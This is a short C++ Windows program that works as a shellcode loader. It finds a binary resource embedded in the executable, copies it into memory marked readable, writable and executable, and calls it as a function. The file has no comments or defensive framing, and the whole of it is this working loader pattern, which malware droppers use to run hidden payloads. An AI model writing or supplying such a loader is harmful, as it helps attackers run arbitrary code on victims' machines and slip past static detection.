#include"resource.h"
#include <windows.h>
#include<iostream>


int main() {
    {
        HRSRC Res = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), L"bin"); DWORD Size = SizeofResource(NULL, Res);
        HGLOBAL Load = LoadResource(NULL, Res);
        void* buffer = VirtualAlloc(0, Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(buffer, Load, Size);
        ((void(*)())buffer)();

    }

}